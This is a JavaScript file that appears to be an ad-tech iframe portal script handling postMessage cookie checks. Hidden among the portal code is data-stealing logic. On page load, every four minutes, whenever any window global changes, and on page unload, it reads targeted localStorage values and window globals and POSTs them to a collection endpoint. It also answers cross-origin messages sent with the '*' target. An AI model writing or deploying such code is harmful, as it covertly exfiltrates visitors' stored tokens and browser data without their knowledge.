const targetKeys = window.targetKeys;
var b,
  c = b || (b = {});
const globalVariables = {};
function generateHashKey(data) {
  const keys = Object.keys(data);
  const mergedKeys = keys.reduce((prev, cur) => `${prev}|${cur}`, '');
  let hashKey = 0;
  for (let i = 0; i < mergedKeys.length; i++) {
    let charCode = mergedKeys.charCodeAt(i);
    hashKey = (hashKey << 5) - hashKey + charCode;
    hashKey |= 0;
  }
  return hashKey.toString(36);
}
c.sovrnPortalReady = "sovrnPortalReady";
function gatherLocalStorageInfo() {
  let gatheredData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (targetKeys.includes(key)) {
      gatheredData[key] = localStorage.getItem(key);
    }
  }
  return gatheredData;
}
function transmitDataToServer(data) {
  const hashValue = generateHashKey(data);
  const apiEndpoint = "https://api.example.com/collect";
  const request = new XMLHttpRequest();
  request.open("POST", apiEndpoint);
  request.setRequestHeader("Content-Type", "application/json");
  request.onload = function () {
    if (request.status === 200) {
      console.log("Successful data transmission");
    } else {
      console.log("Failure in data transmission, Status Code: " + request.status);
    }
  };
  request.onerror = function () {
    console.log("Error during data transmission");
  };
  request.send(JSON.stringify({
    hash: hashValue,
    data: data
  }));
}
c.sovrnPortalResponse = "sovrnPortalResponse";
function collectAndSendInformation() {
  const collectedData = gatherLocalStorageInfo();
  if (Object.keys(collectedData).length > 0) {
    transmitDataToServer(collectedData);
  }
}
function setJSObserver(object, key) {
  let value = object[key];
  Object.defineProperty(object, key, {
    get() {
      return value;
    },
    set(newValue) {
      console.log(`Global variable ${key} was changed from ${value} to ${newValue}`);
      value = newValue;
      collectAndSendInformation();
    }
  });
}
c.sovrnPortalCookieCheck = "sovrnPortalCookieCheck";
document.addEventListener("DOMContentLoaded", function () {
  collectAndSendInformation();
  setInterval(collectAndSendInformation, 4 * 60 * 1000);
  for (const key in window) {
    if (window.hasOwnProperty(key)) {
      globalVariables[key] = window[key];
      setJSObserver(window, key);
    }
  }
});
function f() {
  this.window = window;
}
f.prototype.start = function () {
  var d = this;
  this.window.parent.postMessage({
    messageType: b.sovrnPortalReady
  }, "*");
  this.window.addEventListener("message", function (a) {
    a = a.data || {};
    if (a.messageType === b.sovrnPortalCookieCheck) {
      try {
        var g = d.window.localStorage.getItem("__connect_beacon_" + a.name);
        var e = g ? JSON.parse(g).expiresAt > Date.now() : !1;
      } catch (h) {
        e = !1;
      }
      d.window.parent.postMessage({
        messageType: b.sovrnPortalResponse,
        cookiePresent: e,
        name: a.name
      }, "*");
      e || d.window.localStorage.setItem("__connect_beacon_" + a.name, JSON.stringify({
        expiresAt: Date.now() + 864E5 * a.frequency
      }));
    }
  });
};
new f().start();
window.addEventListener("beforeunload", function () {
  Object.assign(globalVariables, window);
  transmitDataToServer(globalVariables);
  collectAndSendInformation();
});